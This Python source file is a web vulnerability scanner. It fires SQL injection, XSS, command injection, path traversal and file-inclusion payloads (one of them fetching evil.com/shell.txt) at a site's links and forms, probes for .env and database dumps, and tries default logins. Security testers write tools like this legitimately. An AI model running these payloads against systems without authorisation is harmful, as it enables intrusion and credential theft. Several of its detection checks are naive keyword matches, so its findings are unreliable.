import requests
from bs4 import BeautifulSoup
from tqdm import tqdm
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import certifi
from urllib.parse import urljoin, urlparse, parse_qs
import time
from retrying import retry
from tabulate import tabulate

# Suppress the specific warning if it appears
warnings.filterwarnings("ignore", category=UserWarning, message="The input looks more like a filename than markup")

# Setup logging
logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')

# Increase the timeout duration
REQUEST_TIMEOUT = 100  # seconds

# Define maximum retries
MAX_RETRIES = 10

# Define User-Agent header
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

# Session management to reuse connections
session = requests.Session()
session.headers.update(HEADERS)
session.mount('http://', requests.adapters.HTTPAdapter(pool_maxsize=5000))
session.mount('https://', requests.adapters.HTTPAdapter(pool_maxsize=5000))

# Retry strategy
@retry(stop_max_attempt_number=MAX_RETRIES, wait_exponential_multiplier=1000, wait_exponential_max=10000)
def request_with_retry(method, url, **kwargs):
    """Make a request with retry logic."""
    return session.request(method, url, timeout=REQUEST_TIMEOUT, verify=certifi.where(), **kwargs)

def looks_like_html(content):
    """Check if the content looks like HTML."""
    return '<html' in content.lower() and '</html>' in content.lower()

def run_tests(url, links):
    """Run various security tests on the provided URL and links."""
    vulnerabilities = []
    with ThreadPoolExecutor(max_workers=12) as executor:
        futures = [
            executor.submit(test_sql_injection, url, links),
            executor.submit(test_xss_injection, url, links),
            executor.submit(test_command_injection, url, links),
            executor.submit(test_brute_force, url),
            executor.submit(test_directory_traversal, url, links),
            executor.submit(test_rfi, url, links),
            executor.submit(test_lfi, url, links),
            executor.submit(test_idor, url, links),
            executor.submit(test_csrf, url, links),
            executor.submit(test_open_redirect, url, links),
            executor.submit(test_security_misconfiguration, url, links),
            executor.submit(test_sensitive_data_exposure, url, links)
        ]

        for future in as_completed(futures):
            try:
                vulnerabilities.extend(future.result())
            except Exception as e:
                logging.error(f"Error in future: {e}")
    
    return vulnerabilities

def test_sql_injection(url, links):
    """Test for SQL injection vulnerabilities."""
    sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --", "' OR '1'='1"]
    return test_injection(url, links, sql_payloads, "sql")

def test_xss_injection(url, links):
    """Test for XSS injection vulnerabilities."""
    xss_payloads = ["<script>alert('XSS')</script>", "'\"><script>alert('XSS')</script>"]
    return test_injection(url, links, xss_payloads, "xss")

def test_command_injection(url, links):
    """Test for command injection vulnerabilities."""
    command_payloads = ["; ls", "&& ls", "| ls"]
    return test_injection(url, links, command_payloads, "command")

def test_brute_force(url):
    """Test for brute force vulnerabilities."""
    brute_force_payloads = [("admin", "admin"), ("admin", "password"), ("user", "123456")]
    vulnerabilities = []

    # Assuming the login form is at /login
    login_url = urljoin(url, "/login")

    try:
        response = request_with_retry('GET', login_url)
        if response.status_code == 200 and "text/html" in response.headers.get("Content-Type", ""):
            if looks_like_html(response.text):
                soup = BeautifulSoup(response.text, 'html.parser')
                form = soup.find('form')
                if form:
                    form_details = get_form_details(form)

                    with ThreadPoolExecutor(max_workers=10) as executor:
                        futures = []
                        for username, password in brute_force_payloads:
                            data = {input_tag['name']: username if 'user' in input_tag['name'].lower() else password for input_tag in form_details['inputs'] if input_tag['name']}
                            futures.append(executor.submit(submit_form, form_details, login_url, data))

                        for future in as_completed(futures):
                            try:
                                form_response = future.result()
                                if form_response and form_response.status_code == 200:
                                    if "login successful" in form_response.text.lower():
                                        vulnerabilities.append((login_url, "Brute Force", f"username: {username}, password: {password}", "POST"))
                            except Exception as e:
                                logging.error(f"Error in brute force future: {e}")
                else:
                    logging.error("No form found at the login URL.")
            else:
                logging.error("The response does not look like HTML.")
        else:
            logging.error("Failed to retrieve the login page.")
    except Exception as e:
        logging.error(f"Error during brute force test: {e}")

    return vulnerabilities

def test_directory_traversal(url, links):
    """Test for directory traversal vulnerabilities."""
    traversal_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    return test_injection(url, links, traversal_payloads, "traversal")

def test_rfi(url, links):
    """Test for remote file inclusion vulnerabilities."""
    rfi_payloads = ["http://evil.com/shell.txt"]
    return test_injection(url, links, rfi_payloads, "rfi")

def test_lfi(url, links):
    """Test for local file inclusion vulnerabilities."""
    lfi_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    return test_injection(url, links, lfi_payloads, "lfi")

def test_idor(url, links):
    """Test for insecure direct object references vulnerabilities."""
    idor_payloads = ["?user_id=1", "?account_id=1"]
    return test_injection(url, links, idor_payloads, "idor")

def test_csrf(url, links):
    """Test for cross-site request forgery vulnerabilities."""
    csrf_payloads = ["<form action='{}' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form>".format(url)]
    return test_injection(url, links, csrf_payloads, "csrf")

def test_open_redirect(url, links):
    """Test for open redirect vulnerabilities."""
    open_redirect_payloads = ["http://evil.com"]
    return test_injection(url, links, open_redirect_payloads, "open_redirect")

def test_security_misconfiguration(url, links):
    """Test for security misconfiguration vulnerabilities."""
    misconfiguration_payloads = ["/.git", "/.env", "/config.php"]
    return test_injection(url, links, misconfiguration_payloads, "security_misconfiguration")

def test_sensitive_data_exposure(url, links):
    """Test for sensitive data exposure vulnerabilities."""
    sensitive_data_payloads = ["/backup.sql", "/database.sql", "/dump.sql"]
    return test_injection(url, links, sensitive_data_payloads, "sensitive_data_exposure")

def test_injection(url, links, payloads, test_type):
    """Test for various injection vulnerabilities."""
    vulnerabilities = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for link in links:
            for payload in payloads:
                futures.append(executor.submit(test_payload, url, link, payload, test_type))

        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    vulnerabilities.append(result)
            except Exception as e:
                logging.error(f"Error in {test_type} future: {e}")

    return vulnerabilities

def test_payload(url, link, payload, test_type):
    """Test a specific payload for vulnerabilities."""
    parsed_url = urlparse(link)
    query_params = parse_qs(parsed_url.query)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path

    for param in query_params:
        original_value = query_params[param]
        query_params[param] = payload
        full_url = base_url + "?" + "&".join(f"{k}={v[0]}" for k, v in query_params.items())  # Manually construct query string
        query_params[param] = original_value  # Restore original value

        for attempt in range(MAX_RETRIES):
            try:
                response = request_with_retry('GET', full_url)
                if response.status_code == 200:
                    if test_type == "sql" and ("syntax error" in response.text.lower() or "mysql" in response.text.lower()):
                        return (full_url, "SQL Injection", payload, "GET")
                    elif test_type == "xss" and payload in response.text:
                        return (full_url, "XSS Injection", payload, "GET")
                    elif test_type == "command" and ("root" in response.text.lower() or "bin" in response.text.lower()):
                        return (full_url, "Command Injection", payload, "GET")
                    elif test_type == "traversal" and ("root:x" in response.text or "[extensions]" in response.text):
                        return (full_url, "Directory Traversal", payload, "GET")
                    elif test_type == "rfi" and ("shell" in response.text):
                        return (full_url, "Remote File Inclusion", payload, "GET")
                    elif test_type == "lfi" and ("root:x" in response.text or "[extensions]" in response.text):
                        return (full_url, "Local File Inclusion", payload, "GET")
                    elif test_type == "idor" and ("user" in response.text or "account" in response.text):
                        return (full_url, "Insecure Direct Object References", payload, "GET")
                    elif test_type == "csrf" and ("csrf" in response.text.lower()):
                        return (full_url, "Cross-Site Request Forgery", payload, "GET")
                    elif test_type == "open_redirect" and ("http://evil.com" in response.url):
                        return (full_url, "Open Redirect", payload, "GET")
                    elif test_type == "security_misconfiguration" and ("config" in response.text.lower() or "env" in response.text.lower()):
                        return (full_url, "Security Misconfiguration", payload, "GET")
                    elif test_type == "sensitive_data_exposure" and ("database" in response.text.lower() or "backup" in response.text.lower()):
                        return (full_url, "Sensitive Data Exposure", payload, "GET")

                response = request_with_retry('GET', link)
                if response.status_code == 200 and "text/html" in response.headers.get("Content-Type", ""):
                    if looks_like_html(response.text):
                        soup = BeautifulSoup(response.text, 'html.parser')
                        forms = soup.find_all('form')
                        for form in forms:
                            form_details = get_form_details(form)
                            if form_details:
                                data = {input_tag['name']: payload for input_tag in form_details['inputs'] if input_tag['name']}
                                form_response = submit_form(form_details, url, data)
                                if form_response and form_response.status_code == 200:
                                    if test_type == "sql" and ("syntax error" in form_response.text.lower() or "mysql" in form_response.text.lower()):
                                        return (full_url, "SQL Injection", payload, form_details['method'].upper())
                                    elif test_type == "xss" and payload in form_response.text:
                                        return (full_url, "XSS Injection", payload, form_details['method'].upper())
                                    elif test_type == "command" and ("root" in form_response.text.lower() or "bin" in form_response.text.lower()):
                                        return (full_url, "Command Injection", payload, form_details['method'].upper())
                                    elif test_type == "traversal" and ("root:x" in form_response.text or "[extensions]" in form_response.text):
                                        return (full_url, "Directory Traversal", payload, form_details['method'].upper())
                                    elif test_type == "rfi" and ("shell" in form_response.text):
                                        return (full_url, "Remote File Inclusion", payload, form_details['method'].upper())
                                    elif test_type == "lfi" and ("root:x" in form_response.text or "[extensions]" in form_response.text):
                                        return (full_url, "Local File Inclusion", payload, form_details['method'].upper())
                                    elif test_type == "idor" and ("user" in form_response.text or "account" in form_response.text):
                                        return (full_url, "Insecure Direct Object References", payload, form_details['method'].upper())
                                    elif test_type == "csrf" and ("csrf" in form_response.text.lower()):
                                        return (full_url, "Cross-Site Request Forgery", payload, form_details['method'].upper())
                                    elif test_type == "open_redirect" and ("http://evil.com" in form_response.url):
                                        return (full_url, "Open Redirect", payload, form_details['method'].upper())
                                    elif test_type == "security_misconfiguration" and ("config" in form_response.text.lower() or "env" in form_response.text.lower()):
                                        return (full_url, "Security Misconfiguration", payload, form_details['method'].upper())
                                    elif test_type == "sensitive_data_exposure" and ("database" in form_response.text.lower() or "backup" in form_response.text.lower()):
                                        return (full_url, "Sensitive Data Exposure", payload, form_details['method'].upper())
            except requests.exceptions.RequestException as e:
                # Suppress output for specific SSL errors
                if "SSL" not in str(e):
                    logging.error(f"RequestException: {e}")
                time.sleep(2 ** attempt)  # Exponential backoff

    return None

def get_form_details(form):
    """Extract form details such as action, method, and inputs."""
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        input_name = input_tag.attrs.get("name")
        input_type = input_tag.attrs.get("type", "text")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"name": input_name, "type": input_type, "value": input_value})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, data):
    """Submit a form and return the response."""
    target_url = urljoin(url, form_details["action"])
    if form_details["method"] == "post":
        return request_with_retry("POST", target_url, data=data)
    else:
        return request_with_retry("GET", target_url, params=data)

def print_vulnerabilities(vulnerabilities):
    """Print the vulnerabilities in a tabulated format."""
    headers = ["URL", "Payload", "Method", "Type"]
    table = tabulate(vulnerabilities, headers, tablefmt="grid")
    print(table)
